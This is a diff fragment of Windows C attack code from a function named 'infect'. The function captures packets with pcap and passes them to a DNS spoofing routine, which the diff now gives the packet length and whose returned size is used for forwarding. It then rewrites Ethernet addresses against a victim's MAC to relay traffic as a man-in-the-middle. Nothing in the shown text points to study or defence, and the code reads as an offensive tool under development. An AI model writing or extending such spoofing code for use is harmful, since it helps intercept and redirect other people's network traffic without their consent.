@@ -208,9 +208,11 @@ DWORD WINAPI infect(LPVOID lparam)
 	char temp_filter[] = "ip host";
 	struct in_addr n_addr;
 	struct bpf_program fcode;
+
 	int res;
 	struct pcap_pkthdr* pkt_header;
 	const u_char* pkt_data = NULL;
+	size_t packet_size;
 
 	
 	/* allocate heap memory */
@@ -305,7 +307,7 @@ DWORD WINAPI infect(LPVOID lparam)
 		eth_header = (ether_hdr*)pkt_data;
 
 		/* Check for DNS packets */
-		dns_spoofing(pkt_data);
+		packet_size = dns_spoofing(pkt_data, pkt_header->caplen);
 
 		/* change packet src/dst (MITM) */
 		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
@@ -314,8 +316,7 @@ DWORD WINAPI infect(LPVOID lparam)
 		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
 
 		/* foward packet */
-		pcap_sendpacket(fp, pkt_data, pkt_header->caplen);
-		
+		pcap_sendpacket(fp, pkt_data, packet_size);
 	}
 	//deal with routing stuff (wait for DNS sessions)
 	
